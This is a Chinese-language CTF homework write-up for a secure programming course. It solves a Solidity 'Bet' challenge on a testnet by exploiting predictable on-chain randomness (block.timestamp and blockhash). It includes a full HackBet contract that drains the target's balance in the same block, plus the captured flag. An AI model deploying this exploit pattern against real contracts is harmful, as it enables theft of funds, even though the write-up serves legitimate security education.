###### tags: `程式安全`
# Secure Programming HW3 Writeup
## Bet
### 解法：
首先檢查bet.sol的檔案，看一下validate的通關條件，目標是要把BetFactroy建立的Bet的balance給領光
```
require(address(instances[msg.sender]).balance == 0);
```
接著我們看一下怎樣錢才會被領光，在Bet contract的bet function可以發現要讓function的參數guess跟getRandom function的return value一樣，合約才會把錢都給你
```
function bet (uint guess) public payable onlyPlayer {
        require(msg.value > 0);
        if (guess == getRandom()) {
            msg.sender.call{value: address(this).balance}("");
        }
    }
```
那檢查一下getRandom function是怎麼產生random value的，
```
function getRandom () internal returns(uint) {
        uint rand = seed ^ uint(blockhash(block.number - 1));
        seed ^= block.timestamp;
        return rand;
    }
```
它是利用seed,blockhash跟block.number來產生return value
seed是contructor的參數傳進來的
```
constructor (address _player, uint _seed) Challenge(_player) {
        seed = _seed;
    }
```
傳進來的值則是create那個block的block.timestamp
```
function create () public payable {
        require(msg.value >= 0.5 ether);
        instances[msg.sender] = address(new Bet(msg.sender, block.timestamp));
        instances[msg.sender].call{value: 0.5 ether}("");
    }
```
而這些值在上課中講過只要在同個block就會一樣，可以利用其他合約來呼叫並取得同樣的random value

下面是我寫的HackBet.sol合約，有些function是沒刪掉的，我會解釋用到的部份
首先利用跟Hack.sol同樣的語法，讓你可以利用這個合約呼叫BetFactory跟Bet的function，而不會因為用錢包呼叫function被onlyPlayer限制

接下來我們先用create這個function來建立Bet,同時用public variable seed紀錄block.timestamp來得到Bet中的seed，因為他們會被算在同個block，所以block.timestamp會一樣

然後Run這個function是用來call bet的，那因為他們會被算在同個block裡面block.number跟blockhash算的值會一樣，直接把seed ^ uint(blockhash(block.number - 1))當作guess塞進去就會跟getRandom()拿到的值一樣，就可以通過判斷而拿到錢

最重要的是記得寫receive function，我原本沒寫結果收不到錢QQ

withdraw function只是讓你可以把HackBet的錢提回你的錢包而已

```
/**
 *Submitted for verification at Etherscan.io on 2020-10-27
*/

//SPDX-License-Identifier: MIT
pragma solidity >= 0.7.0;

contract BetFactory {
    mapping(address => address) public instances;
    function create() public payable {}
    function validate (uint) public {}
}

contract Bet {
    function bet (uint) public payable {}
}

contract HackBet{
    address public result;
    uint public seed;
    address target;
    
    function validate (address _factory, uint token) public {
        BetFactory factory = BetFactory(_factory);
        factory.validate(token);
    }
    
    function create (address _factory) public payable {
        seed = block.timestamp;
        BetFactory factory = BetFactory(_factory);
        factory.create{value: msg.value}();
    }
    
    function view_instance(address _factory, address _target) public returns (address) {
        BetFactory factory = BetFactory(_factory);
        result = factory.instances(_target);
    }
    
    function Run (address _target) public payable {
        Bet instance = Bet(_target);
        instance.bet{value: 0.001 ether}(seed ^ uint(blockhash(block.number - 1)));
    }
    /*
    function getRandom () internal returns(uint) {
        uint rand = block.timestamp ^ uint(blockhash(block.number - 1));
        return rand;
    }
    */
    function withdraw() public {
        msg.sender.call{value: address(this).balance}("");    
    }
    
    receive () external payable {}
}
```
那接下來講我是怎麼實際操作合約來拿到flag的
首先用remix來deploy你的合約
接著到https://ropsten.etherscan.io/
找到你deploy的合約，上傳你的source code讓你可以在上面做write contract的動作
然後先在create輸入nc指令看到的factory address跟0.5 ether來建立Bet的合約
![](https://i.imgur.com/5SAMLHQ.png)
接著呼叫run來呼叫bet把錢領出來
![](https://i.imgur.com/47Kjgf2.png)
可以從transaction紀錄裡面看到送0.001的msg.value進去後提出了create的0.5+0.001共0.501的錢
![](https://i.imgur.com/SQa9BtF.png)
檢查一下contract確定balance裡面沒錢了
![](https://i.imgur.com/t8nRNzo.png)
最後呼叫validate並在terminal上面拿到flag
![](https://i.imgur.com/PXY1yC5.png)
![](https://i.imgur.com/fj0jfdk.png)

flag如下：
>FLAG{CgMZBaRrk4tY1xnnEdDi}



